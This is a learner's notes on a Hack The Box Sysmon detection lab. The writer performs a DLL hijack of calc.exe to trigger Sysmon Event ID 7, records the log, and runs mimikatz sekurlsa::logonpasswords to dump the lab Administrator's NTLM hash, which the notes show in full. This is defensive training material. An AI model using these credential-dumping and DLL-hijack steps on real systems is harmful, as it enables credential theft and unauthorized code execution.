






![Pasted image 20261015185317.png](../../Attathemnts/Pasted%20image%2020261015185317.png)




![Pasted image 20261015185436.png](../../Attathemnts/Pasted%20image%2020261015185436.png)




To view these events, navigate to the ==🔴Event Viewer== and access "Applications and Services" -> "Microsoft" -> "Windows" -> "Sysmon." A quick check will reveal the presence of the targeted event ID.



maybe i got the point well we may need to trigger the event to happen then work on the lab so i wasted all of this time i should've just  read the next action

![Pasted image 20261016103759.png](../../Attathemnts/Pasted%20image%2020261016103759.png)




Look the thing some time you re not like wrong or dump maybe you jsut need to read the next section lol its normal 

Let's attempt the ==🔴hijack== using "calc.exe" and "WININET.dll" as an example. To simplify the process, we can utilize Stephen Fewer's "hello world" [reflective DLL](https://github.com/stephenfewer/ReflectiveDLLInjection/tree/master/bin). It should be noted that DLL hijacking does not require reflective DLLs.

By following the required steps, which involve renaming `reflective_dll.x64.dll` to `WININET.dll`, moving `calc.exe` from `C:\Windows\System32` along with `WININET.dll` to a writable directory (such as the `Desktop` folder), and executing `calc.exe`, we achieve success. Instead of the Calculator application, a [MessageBox](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa) is displayed.

well they said move we can move it we can only copy it 
To successfully set up your DLL side-loading test, you must **copy** the executable instead:

1. Select `calc.exe` in `C:\Windows\System32` and press **Ctrl+C** (Copy).
    
2. Navigate to your Desktop folder and press **Ctrl+V** (Paste).

Finally we are set to move on:



> [!NOTE]
> "The best thing you can do when learning is keep trying even if its rocket since"




![Pasted image 20261016105942.png](../../Attathemnts/Pasted%20image%2020261016105942.png)

Now im almost sure we are going to find the even id 7


That is the amazing part of the HTB as you can see iv'e spent hours trying to figure this  they said :
By examining the modified configuration, we can observe that the "include" comment signifies events that should be included.

![Pasted image 20261016111115.png](../../Attathemnts/Pasted%20image%2020261016111115.png)


the trick is if you read bellow you see the it exclude signed Microsoft drivers 


![Pasted image 20261016110937.png](../../Attathemnts/Pasted%20image%2020261016110937.png)

that's an amazing feeling now it makes more since for me like if i get the event ID to show up i'm gonna be happy as hell

![Pasted image 20261016111221.png](../../Attathemnts/Pasted%20image%2020261016111221.png)



![Pasted image 20261016111402.png](../../Attathemnts/Pasted%20image%2020261016111402.png)





![Pasted image 20261016111945.png](../../Attathemnts/Pasted%20image%2020261016111945.png)






Finally 


![Pasted image 20261016143259.png](../../Attathemnts/Pasted%20image%2020261016143259.png)




Finally almost their 


![Pasted image 20261016143840.png](../../Attathemnts/Pasted%20image%2020261016143840.png)





```
Log Name:      Microsoft-Windows-Sysmon/Operational
Source:        Microsoft-Windows-Sysmon
Date:          10/16/2026 5:32:06 PM
Event ID:      7
Task Category: Image loaded (rule: ImageLoad)
Level:         Information
Keywords:      
User:          SYSTEM
Computer:      DESKTOP-NU10MTO
Description:
Image loaded:
RuleName: -
UtcTime: 2026-10-17 00:32:06.900
ProcessGuid: {52ff3419-c206-6ad2-2002-000000001000}
ProcessId: 2168
Image: C:\Users\Administrator\Desktop\calc.exe
ImageLoaded: C:\Users\Administrator\Desktop\WININET.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: MD5=D4990A8D2FF6F2433ACDAD04521F85C6,SHA256=51F2305DCF385056C68F7CCF5B1B3B9304865CEF1257947D4AD6EF5FAD2E3B13,IMPHASH=FB1B9FF3C0BBBF95713D517725CEE833
Signed: false
Signature: -
SignatureStatus: Unavailable
User: DESKTOP-NU10MTO\Administrator
Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>7</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>7</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-10-17T00:32:06.9354784Z" />
    <EventRecordID>33111</EventRecordID>
    <Correlation />
    <Execution ProcessID="2832" ThreadID="676" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DESKTOP-NU10MTO</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-10-17 00:32:06.900</Data>
    <Data Name="ProcessGuid">{52ff3419-c206-6ad2-2002-000000001000}</Data>
    <Data Name="ProcessId">2168</Data>
    <Data Name="Image">C:\Users\Administrator\Desktop\calc.exe</Data>
    <Data Name="ImageLoaded">C:\Users\Administrator\Desktop\WININET.dll</Data>
    <Data Name="FileVersion">-</Data>
    <Data Name="Description">-</Data>
    <Data Name="Product">-</Data>
    <Data Name="Company">-</Data>
    <Data Name="OriginalFileName">-</Data>
    <Data Name="Hashes">MD5=D4990A8D2FF6F2433ACDAD04521F85C6,SHA256=51F2305DCF385056C68F7CCF5B1B3B9304865CEF1257947D4AD6EF5FAD2E3B13,IMPHASH=FB1B9FF3C0BBBF95713D517725CEE833</Data>
    <Data Name="Signed">false</Data>
    <Data Name="Signature">-</Data>
    <Data Name="SignatureStatus">Unavailable</Data>
    <Data Name="User">DESKTOP-NU10MTO\Administrator</Data>
  </EventData>
</Event>
```


Finally hhhhh

![Pasted image 20261016145018.png](../../Attathemnts/Pasted%20image%2020261016145018.png)




### Replicate the Unmanaged PowerShell attack described in this section and provide the SHA256 hash of clrjit.dll that spoolsv.exe will load as your answer. "C:\Tools\Sysmon" and "C:\Tools\PSInject" on the spawned target contain everything you need.






![Pasted image 20261017095113.png](../../Attathemnts/Pasted%20image%2020261017095113.png)





### Replicate the Credential Dumping attack described in this section and provide the NTLM hash of the Administrator user as your answer. "C:\Tools\Sysmon" and "C:\Tools\Mimikatz" on the spawned target contain everything you need.


```
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1128191 (00000000:001136ff)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : DESKTOP-NU10MTO
Logon Server      : DESKTOP-NU10MTO
Logon Time        : 5/31/2023 4:14:41 PM
SID               : S-1-5-21-2712802632-2324259492-1677155984-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : DESKTOP-NU10MTO
         * NTLM     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
         * SHA1     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX0812156b
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : DESKTOP-NU10MTO
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : DESKTOP-NU10MTO
         * Password : (null)
        ssp :   KO
        credman :
```




![Pasted image 20261017100418.png](../../Attathemnts/Pasted%20image%2020261017100418.png)



```
msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : DESKTOP-NU10MTO
         * NTLM     : 5e4ffd54b3849aa720ed39f50185e533
         * SHA1     : e6cd3020bb3da2cd8f02dfeaf5c9f6d50812156b
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : DESKTOP-NU10MTO
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : DESKTOP-NU10MTO
         * Password : (null)
        ssp :   KO
        credman :
        
```


